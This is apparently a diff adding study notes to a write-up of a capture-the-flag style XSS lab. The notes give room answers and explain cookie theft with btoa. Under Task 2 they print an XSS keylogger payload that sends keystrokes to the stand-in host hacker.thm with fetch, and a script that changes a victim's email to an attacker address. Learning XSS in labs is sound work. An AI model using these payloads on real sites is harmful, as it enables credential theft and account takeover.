@@ -32,7 +32,37 @@
 
 ## Task 2 XSS Payloads
 
+**Which document property could contain the user's session token?**
+
+    document.cookie
+
+**Which JavaScript method is often used as a Proof Of Concept?**
+
+    alert
+
+btoa()
+
+: Is a function that accepts javascript string as an parameter and base64 encodes it in order to make it safe for a browser to transport. This along with the `document.cookie` parameter an attacker can steal a victims cookie session in order to login as that user without knowing the credentials.
+
+📰 **Note:** Javascript can be used in order to set a keylogger on the victim site thus giving the attacker the chance to passively gather user keystrokes with the goal of obtaining credentials. An example line for a XSS keylogger may look like this:
+
+```js
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+```
+
+Business Logic attacks
+
+: These are flaws in the original design and implementation of the web app that allow an attaker to be able to exectue unintended behavior. This can be used to essentially put the attacker as a Man In The Middle between the user and the application itself. An example of this in terms of XSS would be as follows:
+
+```js
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+
+Where the `user.changeEmail()` would be a function within the application that would enable the attaker to change the official email of the site to one of their control thus potentially posing as a help desk or customer support for the user and social engineering the victim into divulging information/credentials giving access over the victims account.
+
 ## Task 3 Relfected XSS
+
+**Where in an URL is a good place to test for reflected XSS?**
 
 ## Task 4 Stored XSS
 
